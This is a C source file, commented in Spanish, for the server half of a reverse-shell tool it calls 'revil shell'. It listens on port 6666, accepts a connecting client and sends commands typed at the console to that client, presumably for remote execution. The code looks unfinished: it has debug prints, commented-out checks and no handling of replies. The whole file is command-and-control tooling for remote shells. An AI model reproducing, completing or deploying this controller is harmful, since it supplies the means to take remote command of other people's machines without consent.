#include "../include/servidor.h"


int main(int argc, char *argv[]){
  /* Registrando rutina manejadora de señales */
  if(signal(SIGINT, sig_handler)==SIG_ERR)
  {
    printf("No se pudo registrar el manejador para Ctrl-C\n");
  }
  if(signal(SIGPIPE, sig_handler)==SIG_ERR)
  {
    printf("No se pudo registrar el manejador para SIGPIPE\n");
  }
  
  puerto = 6666;
  printf("\nIniciando servidor revil shell...\n");
  socket_des = crear_socket_servidor(puerto);
  if (socket_des == -1 )
  {
    perror("Error abriendo el socket");
    return 0;
  }
  
  int cliente_descriptor;
  char comando[MAX_LINE];
  int tam_comm;
  int datos_enviados;
  cliente_conectado = 0;
  do {
    cliente_descriptor = escuchar_clientes_nuevos();
    while(cliente_conectado)
    {
      // Separar lectura y escritura en hilos diferentes
      
      printf("~~> ");  // Prompt
      //comando = obtener_comando(comando);
      fgets(comando, MAX_LINE, stdin);
      tam_comm = strlen(comando);
      
      //Pruebas
      printf("La longitud del commando es: %d\n",tam_comm);
      printf("Comando ingresado: %s",comando);
      
      /* Enviar el comando al cliente */
      datos_enviados = escribir_socket(cliente_descriptor, comando, tam_comm + 1);
      /*if (datos_enviados == -1){
	printf("Se cerró la conexión con el cliente\n");
	break;
      }*/
      
      //Esperar respuesta del cliente
      
      //free(comando);
    }
  }while(1);
  close(socket_des);
  return 0;
}

/*
#########################################
#					#
#		Métodos			#
#					#
#########################################
*/

int crear_socket_servidor(int puerto)
{
  int sck = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in s_addin;
  s_addin.sin_family = AF_INET;
  s_addin.sin_port = htons(puerto);
  s_addin.sin_addr.s_addr = htonl(INADDR_ANY);
  bzero(&(s_addin.sin_zero),8);
  
  bind(sck,(struct sockaddr *)&s_addin, sizeof(struct sockaddr));
  listen(sck,1);  
  printf(">>> El servidor revil_shell está escuchando.\n");
  return sck;
}

int escuchar_clientes_nuevos(void)
{
  struct sockaddr_in host_cliente;
  int longitud = sizeof(struct sockaddr);
  printf("Esperando conexión...\n");
  int cliente_des = accept(socket_des, (struct sockaddr *)(&host_cliente), &longitud);
  printf("Conexión entrante...\n");
  if(cliente_des==-1)
  {
    printf("No se pudo establecer la conexión\n");
    return -1;
  }
  cliente_conectado = 1;
  printf(">>> Establecida la conexión con: %s\n", inet_ntoa(host_cliente.sin_addr));
  return cliente_des;
}

char * obtener_comando(char *buff)
{
  buff = (char *) malloc(sizeof(char) * MAX_LINE);
  char c;
  int i = 0;
  do{
    c = getchar();
    buff[i] = c;
    ++i;
  }while(c != '\n' && i < (MAX_LINE - 2));
  
  if(c != '\n')
  {
    buff[i] = '\n';
  }
  ++i;
  buff[i] = '\0';
  return (buff);
}

void sig_handler(int signal)
{
  switch(signal)
  {
    case SIGINT:
      //Se precionó Ctrl-C
      printf(" Apagando el servidor...\n");
      close(socket_des);
      exit(0);
      break;
    case SIGPIPE:
      printf("[x] Se ha perdido la conexión con el cliente\n\n");
      cliente_conectado = 0;
      break;
    default: break;
  }
  return;
}